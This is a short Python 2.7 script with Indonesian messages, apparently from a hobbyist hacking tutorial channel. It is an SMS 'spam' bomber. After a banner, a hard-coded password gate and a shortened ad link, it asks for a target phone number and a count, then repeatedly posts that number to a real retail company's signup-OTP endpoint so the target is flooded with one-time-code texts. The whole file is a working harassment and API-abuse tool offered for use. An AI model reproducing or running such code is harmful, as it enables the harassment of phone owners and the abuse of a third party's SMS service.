        # coding:utf8

# TUTORIAL : Kingtebe
# YOUTUBE  : Black-IT
# GITHUB   : https://github.com/KINGTEBE-404
# Python   : 2.7

import os,sys,json,time

try:
# Dimana Module requests belom di install
   import requests
except ImportError:
   print("\n [!] Silahkan install module requests")
   print("     ketik : pip2 install requests\n")
   sys.exit()

os.system('clear')

# banner
logo = """


			 ╔═══╦═══╦═══╦═╗╔═╗ ╔═══╦═╗╔═╦═══╗
			 ║╔═╗║╔═╗║╔═╗║║╚╝║║ ║╔═╗║║╚╝║║╔═╗║
			 ║╚══╣╚═╝║║─║║╔╗╔╗║ ║╚══╣╔╗╔╗║╚══╗
			 ╚══╗║╔══╣╚═╝║║║║║║ ╚══╗║║║║║╠══╗║
			 ║╚═╝║║──║╔═╗║║║║║║ ║╚═╝║║║║║║╚═╝║
			 ╚═══╩╝──╚╝─╚╩╝╚╝╚╝ ╚═══╩╝╚╝╚╩═══╝

	     [•] Author  : opoy1st
	     [•] Youtube : Channel Tutorials
	     [•] BIODATA : Newbie Forever
           ‹-----------------------------------------------------›
"""

print(logo)

print("Silahkan Copy Link : https://realsht.mobi/V6Yif")
Pass = "SUBSCRIBELAHGANKALOKAGASUBSCRIBEMALESBIKINGINIANLAGIGUApwnyapanjangbiarkaliangkbsketikmanaulwkwkekahahaha"

loop = 'true'
while (loop == 'true'):
		password = raw_input("Masukan Password   : ")
		if (password == Pass):
			print "Login Succsesfuly"
			time.sleep(2)
			loop = 'false'
		else:
			print "password salah"

os.system('clear')

# banner
logo = """


			 ╔═══╦═══╦═══╦═╗╔═╗ ╔═══╦═╗╔═╦═══╗
			 ║╔═╗║╔═╗║╔═╗║║╚╝║║ ║╔═╗║║╚╝║║╔═╗║
			 ║╚══╣╚═╝║║─║║╔╗╔╗║ ║╚══╣╔╗╔╗║╚══╗
			 ╚══╗║╔══╣╚═╝║║║║║║ ╚══╗║║║║║╠══╗║
			 ║╚═╝║║──║╔═╗║║║║║║ ║╚═╝║║║║║║╚═╝║
			 ╚═══╩╝──╚╝─╚╩╝╚╝╚╝ ╚═══╩╝╚╝╚╩═══╝

	     [•] Author  : opoy1st
	     [•] Youtube : Channel Tutorials
	     [•] BIODATA : Newbie Forever
           ‹-----------------------------------------------------›
"""

print(logo)
# Penginputan Nomor Target
target = raw_input(" [•] Target : ")
# Penginputan Jumlah Spam
jumlah = raw_input(" [•] Jumlah : ")
print('')

req = requests.Session()

dat = {"phone":target}

for x in range(int(jumlah)):
        x = requests.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat)
        if 'ok' in x.text:
                print(" Spam Ke "+ target +" Berhasil!! Anjir Bet dah!")
                time.sleep(3)
        else:
                print(" Spam Ke "+ target +" Gagal Jancok")
                time.sleep(2)
